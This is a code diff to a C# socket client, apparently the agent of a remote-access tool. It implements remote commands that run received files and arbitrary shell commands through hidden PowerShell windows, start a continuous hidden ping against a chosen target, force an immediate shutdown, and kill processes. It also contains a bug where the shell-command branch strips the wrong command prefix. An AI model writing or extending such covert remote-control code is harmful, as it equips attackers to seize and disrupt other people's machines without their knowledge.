@@ -72,12 +72,43 @@ namespace Client
                             {
                                 string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.ExecFile), "");
 
-                                Process openendProcess = Process.Start(receivedPath);
+                                ProcessStartInfo startInfo = new()
+                                {
+                                    WindowStyle = ProcessWindowStyle.Hidden,
+                                    FileName = "powershell.exe",
+                                    Arguments = receivedPath
+                                };
+
+                                Process process = new()
+                                {
+                                    StartInfo = startInfo
+                                };
+                                process.Start();
                             }
 
                             if (cmd.IsSocketCommmmand(SocketCommands.PingTarget))
                             {
-                                throw new ArgumentException("Not Implemented");
+                                string target = cmd.Replace(Types.SocketCommand(SocketCommands.PingTarget), "");
+
+                                ProcessStartInfo startInfo = new()
+                                {
+                                    WindowStyle = ProcessWindowStyle.Hidden,
+                                    FileName = "powershell.exe",
+                                    Arguments = @$"ping {target} -t -f -i 30"
+                                };
+
+                                Process process = new()
+                                {
+                                    StartInfo = startInfo
+                                };
+                                process.Start();
+                            }
+
+                            if (cmd.IsSocketCommmmand(SocketCommands.KillProcess))
+                            {
+                                string receivedProcess = cmd.Replace(Types.SocketCommand(SocketCommands.KillProcess), "");
+
+                                Process.GetProcessById(int.Parse(receivedProcess)).Kill();
                             }
 
                             if (cmd.IsSocketCommmmand(SocketCommands.ExplorePath))
@@ -88,12 +119,14 @@ namespace Client
 
                                 foreach (string item in Directory.GetDirectories(path))
                                 {
-                                    items.Add(new ItemType(new DirectoryInfo(item).Name, "Directory", item, 0));
+                                    DirectoryInfo dirInfo = new DirectoryInfo(item);
+                                    items.Add(new ItemType(dirInfo.Name, "Directory", item, 0));
                                 }
 
-                                foreach (string item in Directory.GetFiles(path))
+                                foreach (string fileNameAndPath in Directory.GetFiles(path))
                                 {
-                                    items.Add(new ItemType(new DirectoryInfo(item).Name, "File", item, new FileInfo(item).Length));
+                                    FileInfo fileInfo = new FileInfo(fileNameAndPath);
+                                    items.Add(new ItemType(fileInfo.Name, fileInfo.Extension, fileNameAndPath, fileInfo.Length));
                                 }
 
                                 byte[] itemsBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(items));
@@ -116,12 +149,36 @@ namespace Client
 
                             if (cmd.IsSocketCommmmand(SocketCommands.NotifyShellCommand))
                             {
-                                throw new ArgumentException("Not Implemented");
+                                string shellCommand = cmd.Replace(Types.SocketCommand(SocketCommands.NotifyMessage), "");
+
+                                ProcessStartInfo startInfo = new()
+                                {
+                                    WindowStyle = ProcessWindowStyle.Hidden,
+                                    FileName = "powershell.exe",
+                                    Arguments = shellCommand
+                                };
+
+                                Process process = new()
+                                {
+                                    StartInfo = startInfo
+                                };
+                                process.Start();
                             }
 
                             if (cmd.IsSocketCommmmand(SocketCommands.RemoteShutdown))
                             {
-                                throw new ArgumentException("Not Implemented");
+                                ProcessStartInfo startInfo = new()
+                                {
+                                    WindowStyle = ProcessWindowStyle.Hidden,
+                                    FileName = "powershell.exe",
+                                    Arguments = "shutdown -s -t 0"
+                                };
+
+                                Process process = new()
+                                {
+                                    StartInfo = startInfo
+                                };
+                                process.Start();
                             }
 
                             if (cmd.IsSocketCommmmand(SocketCommands.UploadFile))
@@ -156,13 +213,6 @@ namespace Client
                                 byte[] processesBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(processes));
 
                                 await ManagementSocketConnection.SocketWriterAsync(socket, processesBuffer, cancellationToken);
-                            }
-
-                            if (cmd.IsSocketCommmmand(SocketCommands.KillProcess))
-                            {
-                                string receivedProcess = cmd.Replace(Types.SocketCommand(SocketCommands.KillProcess), "");
-
-                                Process.GetProcessById(int.Parse(receivedProcess)).Kill();
                             }
                         }
                         catch (Exception ex)
